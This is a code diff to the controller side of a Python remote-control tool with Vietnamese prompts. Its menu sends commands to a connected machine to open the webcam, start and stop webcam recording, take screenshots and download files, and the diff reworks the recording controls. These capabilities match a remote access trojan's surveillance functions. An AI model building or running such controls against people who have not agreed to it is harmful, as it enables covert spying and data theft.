@@ -8,6 +8,7 @@ import json
 import os
 import socket
 import struct
+import tkinter as tk
 from typing import Any, Dict
 
 SERVER_PORT = 12345
@@ -101,8 +102,11 @@ def main():
                 elif choice == "6":  # Webcam open
                     send_message(conn, {"action": "webcam_open"})
                 elif choice == "7":  # Webcam record
-                    seconds = int(input("Ghi video mấy giây (mặc định 5): ") or "5")
-                    send_message(conn, {"action": "webcam_record", "seconds": seconds})
+                    sub = input("r: start | s: stop -> ").strip().lower()
+                    if sub == "r":
+                        send_message(conn, {"action": "webcam_record_start"})
+                    elif sub == "s":
+                        send_message(conn, {"action": "webcam_record_stop"})
                 elif choice == "8":  # Download file
                     path = input("Đường dẫn file từ máy đích: ").strip()
                     send_message(conn, {"action": "download", "path": path})
@@ -121,6 +125,7 @@ def main():
                 data = resp.get("data")
                 encoding = resp.get("encoding")
 
+
                 if encoding and status == "ok":
                     if encoding.startswith("base64_png"):
                         path = save_base64_file(data, "screenshot.png")
@@ -129,7 +134,7 @@ def main():
                         path = save_base64_file(data, "webcam.jpg")
                         print(f"Webcam image saved to {path}")
                     elif encoding.startswith("base64_mp4"):
-                        path = save_base64_file(data, "webcam.mp4")
+                        path = save_base64_file(data, "record.mp4")
                         print(f"Webcam video saved to {path}")
                     elif encoding.startswith("base64_file"):
                         path = save_base64_file(data, "download.bin")
